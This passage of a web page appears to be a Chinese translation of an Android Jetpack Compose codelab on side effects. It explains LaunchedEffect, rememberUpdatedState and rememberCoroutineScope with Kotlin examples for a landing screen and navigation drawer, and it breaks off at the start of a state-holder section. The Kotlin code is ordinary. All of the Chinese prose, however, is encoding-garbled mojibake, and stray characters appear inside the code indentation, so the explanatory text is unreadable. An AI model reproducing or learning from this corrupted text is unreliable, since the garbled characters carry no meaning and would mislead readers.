<p>å¦‚éœ€äº†è§£è¯¦æƒ…ï¼Œè¯·å‚é˜…â€œçŠ¶æ€â€æ–‡æ¡£ä¸­çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%2Fstate%3Fhl%3Dzh-cn%23use-other-types-of-state-in-jetpack-compose" target="_blank" title="https://developer.android.com/jetpack/compose/state?hl=zh-cn#use-other-types-of-state-in-jetpack-compose" ref="nofollow noopener noreferrer">å…¶ä»–å—æ”¯æŒçš„çŠ¶æ€ç±»å‹</a>é¡µé¢ã€‚</p>
</blockquote>
<h2 data-id="heading-12">5. LaunchedEffect å’Œ rememberUpdatedState</h2>
<p>åœ¨è¯¥é¡¹ç›®ä¸­ï¼Œæœ‰ä¸€ä¸ªç›®å‰æœªä½¿ç”¨çš„Â <code>home/LandingScreen.kt</code>Â æ–‡ä»¶ã€‚æ‚¨æƒ³è¦å‘åº”ç”¨æ·»åŠ ä¸€ä¸ªç€é™†å±å¹•ï¼Œå®ƒæœ‰å¯èƒ½ä¼šç”¨äºåœ¨åå°åŠ è½½éœ€è¦çš„æ‰€æœ‰æ•°æ®ã€‚</p>
<p>ç€é™†å±å¹•å°†å æ®æ•´ä¸ªå±å¹•ï¼Œå¹¶åœ¨å±å¹•ä¸­é—´æ˜¾ç¤ºåº”ç”¨çš„å¾½æ ‡ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæ‚¨ä¼šæ˜¾ç¤ºè¯¥å±å¹•ï¼Œåœ¨æ‰€æœ‰æ•°æ®åŠ è½½å®Œæ¯•ä¹‹åï¼Œæ‚¨ä¼šé€šçŸ¥è°ƒç”¨æ–¹å¯ä»¥ä½¿ç”¨Â <code>onTimeout</code>Â å›è°ƒå…³é—­ç€é™†å±å¹•ã€‚</p>
<p>å»ºè®®ä½¿ç”¨ Kotlin åç¨‹åœ¨ Android ä¸­æ‰§è¡Œå¼‚æ­¥æ“ä½œã€‚åº”ç”¨åœ¨å¯åŠ¨æ—¶é€šå¸¸ä¼šä½¿ç”¨åç¨‹åœ¨åå°åŠ è½½å†…å®¹ã€‚Jetpack Compose æä¾›äº†å¯è®©æ‚¨åœ¨ç•Œé¢å±‚ä¸­å®‰å…¨ä½¿ç”¨åç¨‹çš„ APIã€‚ç”±äºæ­¤åº”ç”¨ä¸ä¸åç«¯è¿›è¡Œé€šä¿¡ï¼Œå› æ­¤æ‚¨å°†ä½¿ç”¨åç¨‹çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlin.github.io%2Fkotlinx.coroutines%2Fkotlinx-coroutines-core%2Fkotlinx.coroutines%2Fdelay.html" target="_blank" title="https://kotlin.github.io/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines/delay.html" ref="nofollow noopener noreferrer"><code>delay</code></a>Â å‡½æ•°æ¥æ¨¡æ‹Ÿåœ¨åå°åŠ è½½å†…å®¹ã€‚</p>
<blockquote>
<p><strong>Compose ä¸­çš„é™„å¸¦æ•ˆåº”æ˜¯æŒ‡å‘ç”Ÿåœ¨å¯ç»„åˆå‡½æ•°ä½œç”¨åŸŸä¹‹å¤–çš„åº”ç”¨çŠ¶æ€çš„å˜åŒ–ã€‚</strong> ä¾‹å¦‚ï¼Œå½“ç”¨æˆ·ç‚¹æŒ‰ä¸€ä¸ªæŒ‰é’®æ—¶æ‰“å¼€ä¸€ä¸ªæ–°å±å¹•ï¼Œæˆ–è€…åœ¨åº”ç”¨æœªè¿æ¥åˆ°äº’è”ç½‘æ—¶æ˜¾ç¤ºä¸€æ¡æ¶ˆæ¯ã€‚</p>
</blockquote>
<p>Compose ä¸­çš„é™„å¸¦æ•ˆåº”æ˜¯æŒ‡å‘ç”Ÿåœ¨å¯ç»„åˆå‡½æ•°ä½œç”¨åŸŸä¹‹å¤–çš„åº”ç”¨çŠ¶æ€çš„å˜åŒ–ã€‚å°†çŠ¶æ€æ›´æ”¹ä¸ºæ˜¾ç¤º/éšè—ç€é™†å±å¹•çš„æ“ä½œå°†å‘ç”Ÿåœ¨Â <code>onTimeout</code>Â å›è°ƒä¸­ï¼Œç”±äºåœ¨è°ƒç”¨Â <code>onTimeout</code>Â ä¹‹å‰æ‚¨éœ€è¦å…ˆä½¿ç”¨åç¨‹åŠ è½½å†…å®¹ï¼Œå› æ­¤çŠ¶æ€å˜åŒ–å¿…é¡»å‘ç”Ÿåœ¨åç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ï¼</p>
<p>å¦‚éœ€ä»å¯ç»„åˆé¡¹å†…å®‰å…¨åœ°è°ƒç”¨æŒ‚èµ·å‡½æ•°ï¼Œè¯·ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23LaunchedEffect(kotlin.Any%2Ckotlin.coroutines.SuspendFunction1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#LaunchedEffect(kotlin.Any,kotlin.coroutines.SuspendFunction1)" ref="nofollow noopener noreferrer"><code>LaunchedEffect</code></a>Â APIï¼Œè¯¥ API ä¼šåœ¨ Compose ä¸­è§¦å‘åç¨‹ä½œç”¨åŸŸé™å®šçš„é™„å¸¦æ•ˆåº”ã€‚</p>
<p>å½“Â <code>LaunchedEffect</code>Â è¿›å…¥ç»„åˆæ—¶ï¼Œå®ƒä¼šå¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œå¹¶å°†ä»£ç å—ä½œä¸ºå‚æ•°ä¼ é€’ã€‚å¦‚æœÂ <code>LaunchedEffect</code>Â é€€å‡ºç»„åˆï¼Œåç¨‹å°†å–æ¶ˆã€‚</p>
<p>è™½ç„¶æ¥ä¸‹æ¥çš„ä»£ç ä¸æ­£ç¡®ï¼Œä½†è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨æ­¤ APIï¼Œå¹¶æ¢è®¨ä¸ºä»€ä¹ˆä¸‹é¢çš„ä»£ç æ˜¯é”™è¯¯çš„ã€‚æ‚¨å°†åœ¨æ­¤æ­¥éª¤çš„åé¢è°ƒç”¨Â <code>LandingScreen</code>Â å¯ç»„åˆé¡¹ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// home/LandingScreen.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.LaunchedEffect
<span class="hljs-keyword">import</span> kotlinx.coroutines.delay

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">LandingScreen</span><span class="hljs-params">(onTimeout: () -&gt; <span class="hljs-type">Unit</span>, modifier: <span class="hljs-type">Modifier</span> = Modifier)</span></span> {
Â  Â  Box(modifier = modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
Â  Â  Â  Â  <span class="hljs-comment">// Start a side effect to load things in the background</span>
Â  Â  Â  Â  <span class="hljs-comment">// and call onTimeout() when finished.</span>
Â  Â  Â  Â  <span class="hljs-comment">// Passing onTimeout as a parameter to LaunchedEffect</span>
Â  Â  Â  Â  <span class="hljs-comment">// is wrong! Don't do this. We'll improve this code in a sec.</span>
Â  Â  Â  Â  LaunchedEffect(onTimeout) {
Â  Â  Â  Â  Â  Â  delay(SplashWaitTime) <span class="hljs-comment">// Simulates loading things</span>
Â  Â  Â  Â  Â  Â  onTimeout()
Â  Â  Â  Â  }
Â  Â  Â  Â  Image(painterResource(id = R.drawable.ic_crane_drawer), contentDescription = <span class="hljs-literal">null</span>)
Â  Â  }
}
</code></pre>
<p>æŸäº›é™„å¸¦æ•ˆåº” APIï¼ˆå¦‚Â <code>LaunchedEffect</code>ï¼‰å°†å¯å˜æ•°é‡çš„é”®ä½œä¸ºå½¢å‚ï¼Œç”¨äºåœ¨å…¶ä¸­ä¸€ä¸ªé”®å‘ç”Ÿæ›´æ”¹æ—¶<strong>é‡æ–°å¼€å§‹</strong>æ‰§è¡Œæ•ˆåº”ã€‚æ‚¨å‘ç°é”™è¯¯äº†å—ï¼Ÿæˆ‘ä»¬ä¸å¸Œæœ›åœ¨æ­¤å¯ç»„åˆå‡½æ•°çš„è°ƒç”¨æ–¹ä¼ é€’ä¸åŒçš„Â <code>onTimeout</code>Â lambda å€¼æ—¶é‡å¯Â <code>LaunchedEffect</code>ã€‚è¿™ä¼šè®©Â <code>delay</code>Â å†æ¬¡å¯åŠ¨ï¼Œä½¿å¾—æ‚¨æ— æ³•æ»¡è¶³ç›¸å…³è¦æ±‚ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å¦‚éœ€åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%2Flifecycle%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/jetpack/compose/lifecycle?hl=zh-cn" ref="nofollow noopener noreferrer">æ­¤å¯ç»„åˆé¡¹çš„ç”Ÿå‘½å‘¨æœŸ</a>å†…ä»…è§¦å‘ä¸€æ¬¡é™„å¸¦æ•ˆåº”ï¼Œè¯·å°†å¸¸é‡ç”¨ä½œé”®ï¼Œä¾‹å¦‚Â <code>LaunchedEffect(Unit) { ... }</code>ã€‚ä¸è¿‡ï¼Œç°åœ¨åˆæœ‰ä¸€ä¸ªé—®é¢˜ã€‚</p>
<p>å¦‚æœÂ <code>onTimeout</code>Â åœ¨é™„å¸¦æ•ˆåº”æ­£åœ¨è¿›è¡Œæ—¶å‘ç”Ÿå˜åŒ–ï¼Œæ•ˆåº”ç»“æŸæ—¶ä¸ä¸€å®šä¼šè°ƒç”¨æœ€åä¸€ä¸ªÂ <code>onTimeout</code>ã€‚å¦‚éœ€ä¿è¯è°ƒç”¨æœ€åä¸€ä¸ªÂ <code>onTimeout</code>ï¼Œè¯·ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23rememberUpdatedState(kotlin.Any)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#rememberUpdatedState(kotlin.Any)" ref="nofollow noopener noreferrer"><code>rememberUpdatedState</code></a>Â API è®°ä½Â <code>onTimeout</code>ã€‚æ­¤ API ä¼šæ•è·å¹¶æ›´æ–°æœ€æ–°å€¼ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// home/LandingScreen.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.getValue
<span class="hljs-keyword">import</span> androidx.compose.runtime.rememberUpdatedState
<span class="hljs-keyword">import</span> kotlinx.coroutines.delay

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">LandingScreen</span><span class="hljs-params">(onTimeout: () -&gt; <span class="hljs-type">Unit</span>, modifier: <span class="hljs-type">Modifier</span> = Modifier)</span></span> {
Â  Â  Box(modifier = modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
Â  Â  Â  Â  <span class="hljs-comment">// This will always refer to the latest onTimeout function that</span>
Â  Â  Â  Â  <span class="hljs-comment">// LandingScreen was recomposed with</span>
Â  Â  Â  Â  <span class="hljs-keyword">val</span> currentOnTimeout <span class="hljs-keyword">by</span> rememberUpdatedState(onTimeout)

Â  Â  Â  Â  <span class="hljs-comment">// Create an effect that matches the lifecycle of LandingScreen.</span>
Â  Â  Â  Â  <span class="hljs-comment">// If LandingScreen recomposes or onTimeout changes, </span>
Â  Â  Â  Â  <span class="hljs-comment">// the delay shouldn't start again.</span>
Â  Â  Â  Â  LaunchedEffect(<span class="hljs-built_in">Unit</span>) {
Â  Â  Â  Â  Â  Â  delay(SplashWaitTime)
Â  Â  Â  Â  Â  Â  currentOnTimeout()
Â  Â  Â  Â  }

Â  Â  Â  Â  Image(painterResource(id = R.drawable.ic_crane_drawer), contentDescription = <span class="hljs-literal">null</span>)
Â  Â  }
}
</code></pre>
<p>å½“é•¿æœŸå­˜åœ¨çš„ lambda æˆ–å¯¹è±¡è¡¨è¾¾å¼å¼•ç”¨åœ¨ç»„åˆæœŸé—´è®¡ç®—çš„å‚æ•°æˆ–å€¼æ—¶ï¼Œæ‚¨åº”ä½¿ç”¨Â <code>rememberUpdatedState</code>ï¼Œè¿™åœ¨ä½¿ç”¨Â <code>LaunchedEffect</code>Â æ—¶å¯èƒ½å¾ˆå¸¸è§ã€‚</p>
<h3 data-id="heading-13">æ˜¾ç¤ºç€é™†å±å¹•</h3>
<p>ç°åœ¨ï¼Œæ‚¨éœ€è¦åœ¨åº”ç”¨æ‰“å¼€åæ˜¾ç¤ºç€é™†å±å¹•ã€‚æ‰“å¼€Â <code>home/MainActivity.kt</code>Â æ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹é¦–æ¬¡è°ƒç”¨çš„Â <code>MainScreen</code>Â å¯ç»„åˆé¡¹ã€‚</p>
<p>åœ¨Â <code>MainScreen</code>Â å¯ç»„åˆé¡¹ä¸­ï¼Œæ‚¨åªéœ€æ·»åŠ ä¸€ç§å†…éƒ¨çŠ¶æ€ï¼Œç”¨æ¥è·Ÿè¸ªæ˜¯å¦åº”æ˜¾ç¤ºç€é™†å±å¹•ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// home/MainActivity.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.getValue
<span class="hljs-keyword">import</span> androidx.compose.runtime.mutableStateOf
<span class="hljs-keyword">import</span> androidx.compose.runtime.remember
<span class="hljs-keyword">import</span> androidx.compose.runtime.setValue

<span class="hljs-meta">@Composable</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">MainScreen</span><span class="hljs-params">(onExploreItemClicked: <span class="hljs-type">OnExploreItemClicked</span>)</span></span> {
Â  Â  Surface(color = MaterialTheme.colors.primary) {
Â  Â  Â  Â  <span class="hljs-keyword">var</span> showLandingScreen <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">true</span>) }
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (showLandingScreen) {
Â  Â  Â  Â  Â  Â  LandingScreen(onTimeout = { showLandingScreen = <span class="hljs-literal">false</span> })
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  CraneHome(onExploreItemClicked = onExploreItemClicked)
Â  Â  Â  Â  }
Â  Â  }
}
</code></pre>
<p>å¦‚æœæ‚¨ç°åœ¨è¿è¡Œåº”ç”¨ï¼Œæ‚¨åº”è¯¥ä¼šçœ‹åˆ°Â <code>LandingScreen</code>Â å‡ºç°å¹¶åœ¨ 2 ç§’åæ¶ˆå¤±ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9911e5fd229b4bcb8e972604a49eb90f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766048446&amp;x-signature=DI%2Fgq2wjmkvxjnyBEqzMVFTaKKI%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-14">6. rememberCoroutineScope</h2>
<p>åœ¨æ­¤æ­¥éª¤ä¸­ï¼Œæ‚¨å°†ä½¿æŠ½å±‰å¼å¯¼èˆªæ æ­£å¸¸å·¥ä½œã€‚ç›®å‰ï¼Œå¦‚æœæ‚¨å°è¯•ç‚¹æŒ‰æ±‰å ¡å¼èœå•ï¼Œä»€ä¹ˆéƒ½ä¸ä¼šå‘ç”Ÿã€‚</p>
<p>æ‰“å¼€Â <code>home/CraneHome.kt</code>Â æ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹Â <code>CraneHome</code>Â å¯ç»„åˆé¡¹ï¼Œçœ‹çœ‹æ‚¨éœ€è¦åœ¨ä½•å¤„æ‰“å¼€æŠ½å±‰å¼å¯¼èˆªæ ï¼šåœ¨Â <code>openDrawer</code>Â å›è°ƒä¸­ï¼</p>
<p>åœ¨Â <code>CraneHome</code>Â ä¸­ï¼Œæœ‰ä¸€ä¸ªåŒ…å«Â <code>DrawerState</code>Â çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fmaterial%2FScaffoldState%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/material/ScaffoldState?hl=zh-cn" ref="nofollow noopener noreferrer"><code>scaffoldState</code></a>ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fmaterial%2FDrawerState%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/material/DrawerState?hl=zh-cn" ref="nofollow noopener noreferrer"><code>DrawerState</code></a>Â å…·æœ‰ä»¥ç¨‹åºåŒ–æ–¹å¼æ‰“å¼€å’Œå…³é—­æŠ½å±‰å¼å¯¼èˆªæ çš„æ–¹æ³•ã€‚ä¸è¿‡ï¼Œå¦‚æœæ‚¨å°è¯•åœ¨Â <code>openDrawer</code>Â å›è°ƒä¸­ç¼–å†™Â <code>scaffoldState.drawerState.open()</code>ï¼Œæ‚¨ä¼šæ”¶åˆ°ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼è¿™æ˜¯å› ä¸ºï¼Œ<code>open</code>Â å‡½æ•°æ˜¯ä¸€ä¸ª<strong>æŒ‚èµ·</strong>å‡½æ•°ã€‚æˆ‘ä»¬å†æ¬¡è¿›å…¥åç¨‹çš„é¢†åŸŸã€‚</p>
<p>é™¤äº†å¯è®©æ‚¨ä»ç•Œé¢å±‚å®‰å…¨è°ƒç”¨åç¨‹çš„ API ä¹‹å¤–ï¼ŒæŸäº› Compose API æ˜¯æŒ‚èµ·å‡½æ•°ã€‚ç”¨äºæ‰“å¼€æŠ½å±‰å¼å¯¼èˆªæ çš„ API å°±æ˜¯ä¸€ä¸ªè¿™æ ·çš„ä¾‹å­ã€‚æŒ‚èµ·å‡½æ•°é™¤äº†èƒ½å¤Ÿè¿è¡Œå¼‚æ­¥ä»£ç ä¹‹å¤–ï¼Œè¿˜å¯ä»¥å¸®åŠ©è¡¨ç¤ºéšç€æ—¶é—´çš„æ¨ç§»å‡ºç°çš„æ¦‚å¿µã€‚æ‰“å¼€æŠ½å±‰å¼å¯¼èˆªæ éœ€è¦èŠ±äº›æ—¶é—´ã€è¿›è¡Œç§»åŠ¨ï¼Œè€Œä¸”è¿˜æœ‰å¯èƒ½éœ€è¦æ˜¾ç¤ºåŠ¨ç”»ï¼Œè¿™å¯ä»¥é€šè¿‡æŒ‚èµ·å‡½æ•°å®Œç¾åœ°åæ˜ å‡ºæ¥ï¼ŒæŒ‚èµ·å‡½æ•°å°†åœ¨è¢«è°ƒç”¨çš„åœ°æ–¹æš‚åœåç¨‹çš„æ‰§è¡Œï¼Œç›´åˆ°å®ƒå®Œæˆï¼Œç„¶åå†ç»§ç»­æ‰§è¡Œã€‚</p>
<p>å¿…é¡»åœ¨åç¨‹ä¸­è°ƒç”¨Â <code>scaffoldState.drawerState.open()</code>ã€‚æ‚¨å¯é‡‡å–çš„è¡ŒåŠ¨Â <code>openDrawer</code>Â æ˜¯ä¸€ä¸ªç®€å•çš„å›è°ƒå‡½æ•°ï¼Œå› æ­¤ï¼š</p>
<ul>
<li>æ‚¨ä¸èƒ½ç®€å•åœ°åœ¨å…¶ä¸­è°ƒç”¨æŒ‚èµ·å‡½æ•°ï¼Œå› ä¸ºÂ <code>openDrawer</code>Â ä¸åœ¨åç¨‹çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚</li>
<li>æ‚¨ä¸èƒ½åƒä¹‹å‰ä¸€æ ·ä½¿ç”¨Â <code>LaunchedEffect</code>ï¼Œå› ä¸ºä¸èƒ½åœ¨Â <code>openDrawer</code>Â ä¸­è°ƒç”¨å¯ç»„åˆé¡¹ã€‚æˆ‘ä»¬ä¸åœ¨ç»„åˆä¸­ã€‚</li>
</ul>
<p>æ‚¨å¸Œæœ›å¯åŠ¨ä¸€ä¸ªåç¨‹ï¼›åº”ä½¿ç”¨å“ªä¸ªä½œç”¨åŸŸå‘¢ï¼Ÿç†æƒ³æƒ…å†µä¸‹ï¼Œæ‚¨å¸Œæœ›Â <code>CoroutineScope</code>Â èƒ½å¤Ÿéµå¾ªå…¶è°ƒç”¨ç‚¹çš„ç”Ÿå‘½å‘¨æœŸã€‚å¦‚æœä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23rememberCoroutineScope(kotlin.Function0)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#rememberCoroutineScope(kotlin.Function0)" ref="nofollow noopener noreferrer"><code>rememberCoroutineScope</code></a>Â APIï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ªÂ <code>CoroutineScope</code>ï¼Œè¯¥ CoroutineScope ä¼šç»‘å®šåˆ°å®ƒåœ¨ç»„åˆä¸­çš„è°ƒç”¨ç‚¹ã€‚ä¸€æ—¦é€€å‡ºç»„åˆï¼Œä½œç”¨åŸŸå°†è‡ªåŠ¨å–æ¶ˆã€‚æœ‰äº†è¿™ä¸ªä½œç”¨åŸŸï¼Œå³ä½¿æ‚¨ä¸åœ¨ç»„åˆä¸­ï¼ˆä¾‹å¦‚ï¼Œåœ¨Â <code>openDrawer</code>Â å›è°ƒä¸­ï¼‰ï¼Œä¹Ÿå¯ä»¥å¯åŠ¨åç¨‹ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// home/CraneHome.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.rememberCoroutineScope
<span class="hljs-keyword">import</span> kotlinx.coroutines.launch

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CraneHome</span><span class="hljs-params">(
Â  Â  onExploreItemClicked: <span class="hljs-type">OnExploreItemClicked</span>,
Â  Â  modifier: <span class="hljs-type">Modifier</span> = Modifier,
)</span></span> {
Â  Â  <span class="hljs-keyword">val</span> scaffoldState = rememberScaffoldState()
Â  Â  Scaffold(
Â  Â  Â  Â  scaffoldState = scaffoldState,
Â  Â  Â  Â  modifier = Modifier.statusBarsPadding(),
Â  Â  Â  Â  drawerContent = {
Â  Â  Â  Â  Â  Â  CraneDrawer()
Â  Â  Â  Â  }
Â  Â  ) {
Â  Â  Â  Â  <span class="hljs-keyword">val</span> scope = rememberCoroutineScope()
Â  Â  Â  Â  CraneHomeContent(
Â  Â  Â  Â  Â  Â  modifier = modifier,
Â  Â  Â  Â  Â  Â  onExploreItemClicked = onExploreItemClicked,
Â  Â  Â  Â  Â  Â  openDrawer = {
Â  Â  Â  Â  Â  Â  Â  Â  scope.launch {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  scaffoldState.drawerState.<span class="hljs-keyword">open</span>()
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  )
Â  Â  }
}
</code></pre>
<p>å¦‚æœæ‚¨è¿è¡Œåº”ç”¨ï¼Œæ‚¨ä¼šçœ‹åˆ°å½“æ‚¨ç‚¹æŒ‰æ±‰å ¡å¼èœå•å›¾æ ‡æ—¶ï¼Œç³»ç»Ÿä¼šæ‰“å¼€æŠ½å±‰å¼å¯¼èˆªæ ã€‚</p>
<h3 data-id="heading-15">LaunchedEffect ä¸ rememberCoroutineScope</h3>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹æ— æ³•ä½¿ç”¨Â <code>LaunchedEffect</code>ï¼Œå› ä¸ºæ‚¨éœ€è¦è§¦å‘è°ƒç”¨ä»¥åœ¨ç»„åˆä¹‹å¤–çš„å¸¸è§„å›è°ƒä¸­åˆ›å»ºåç¨‹ã€‚</p>
<p>å›é¡¾ä¸€ä¸‹ä½¿ç”¨Â <code>LaunchedEffect</code>Â çš„ç€é™†å±å¹•æ­¥éª¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Â <code>rememberCoroutineScope</code>Â å¹¶è°ƒç”¨Â <code>scope.launch { delay(); onTimeout(); }</code>Â è€Œä¸ä½¿ç”¨Â <code>LaunchedEffect</code>Â å—ï¼Ÿ</p>
<p>æ‚¨æœ¬æ¥å¯ä»¥è¿™æ ·åšï¼Œè€Œä¸”ä¼¼ä¹å¯è¡Œï¼Œä½†è¿™æ ·å¹¶ä¸æ­£ç¡®ã€‚å¦‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%2Fmental-model%3Fhl%3Dzh-cn%23any-order" target="_blank" title="https://developer.android.com/jetpack/compose/mental-model?hl=zh-cn#any-order" ref="nofollow noopener noreferrer">â€œCompose ç¼–ç¨‹æ€æƒ³â€æ–‡æ¡£</a>ä¸­æ‰€è¿°ï¼ŒCompose å¯ä»¥éšæ—¶è°ƒç”¨å¯ç»„åˆé¡¹ã€‚<code>LaunchedEffect</code>Â å¯ä»¥ä¿è¯å½“å¯¹è¯¥å¯ç»„åˆé¡¹çš„è°ƒç”¨ä½¿å…¶è¿›å…¥ç»„åˆæ—¶å°†ä¼šæ‰§è¡Œé™„å¸¦æ•ˆåº”ã€‚å¦‚æœæ‚¨åœ¨Â <code>LandingScreen</code>Â çš„ä¸»ä½“ä¸­ä½¿ç”¨Â <code>rememberCoroutineScope</code>Â å’ŒÂ <code>scope.launch</code>ï¼Œåˆ™æ¯æ¬¡ Compose è°ƒç”¨Â <code>LandingScreen</code>Â æ—¶éƒ½ä¼šæ‰§è¡Œåç¨‹ï¼Œè€Œä¸ç®¡è¯¥è°ƒç”¨æ˜¯å¦ä½¿å…¶è¿›å…¥ç»„åˆã€‚å› æ­¤ï¼Œæ‚¨ä¼šæµªè´¹èµ„æºï¼Œè€Œä¸”ä¸ä¼šåœ¨å—æ§ç¯å¢ƒä¸­æ‰§è¡Œæ­¤é™„å¸¦æ•ˆåº”ã€‚</p>
<h2 data-id="heading-16">7. åˆ›å»ºçŠ¶æ€å®¹å™¨</h2>
<p>æ‚¨æ³¨æ„åˆ°äº†å—ï¼Ÿå¦‚æœæ‚¨ç‚¹æŒ‰â€œChoose Destinationâ€ï¼Œæ‚¨å¯ä»¥ä¿®æ”¹è¯¥å­—æ®µï¼Œå¹¶æ ¹æ®æœç´¢è¾“å…¥è¿‡æ»¤åŸå¸‚ã€‚æ­¤å¤–ï¼Œæ‚¨æˆ–è®¸è¿˜æ³¨æ„åˆ°äº†ï¼Œæ¯å½“æ‚¨ä¿®æ”¹â€œChoose Destinationâ€æ—¶ï¼Œæ–‡æœ¬æ ·å¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d3b1750f3f840619a77730c387d81be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766048446&amp;x-signature=HrS64TARh%2Fnkj691iSbShoTt6v8%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰“å¼€Â <code>base/EditableUserInput.kt</code>Â æ–‡ä»¶ã€‚<code>CraneEditableUserInput</code>Â æœ‰çŠ¶æ€å¯ç»„åˆé¡¹æ¥å—ä¸€äº›å‚æ•°ï¼Œå¦‚Â <code>hint</code>Â å’ŒÂ <code>caption</code>ï¼Œåè€…å¯¹åº”äºå›¾æ ‡æ—è¾¹çš„å¯é€‰æ–‡æœ¬ã€‚ä¾‹å¦‚ï¼Œå½“æ‚¨æœç´¢ç›®çš„åœ°æ—¶ï¼Œä¼šå‡ºç°Â <code>caption</code>â€œToâ€ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// base/EditableUserInput.kt file - code in the main branch</span>

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CraneEditableUserInput</span><span class="hljs-params">(
Â  Â  hint: <span class="hljs-type">String</span>,
Â  Â  caption: <span class="hljs-type">String</span>? = <span class="hljs-literal">null</span>,
Â  Â  <span class="hljs-meta">@DrawableRes</span> vectorImageId: <span class="hljs-type">Int</span>? = <span class="hljs-literal">null</span>,
Â  Â  onInputChanged: (<span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Unit</span>
)</span></span> {
Â  Â  <span class="hljs-comment">// TODO Codelab: Encapsulate this state in a state holder</span>
Â  Â  <span class="hljs-keyword">var</span> textState <span class="hljs-keyword">by</span> remember { mutableStateOf(hint) }
Â  Â  <span class="hljs-keyword">val</span> isHint = { textState == hint }

Â  Â  ...
}
</code></pre>
<h3 data-id="heading-17">åŸå› </h3>
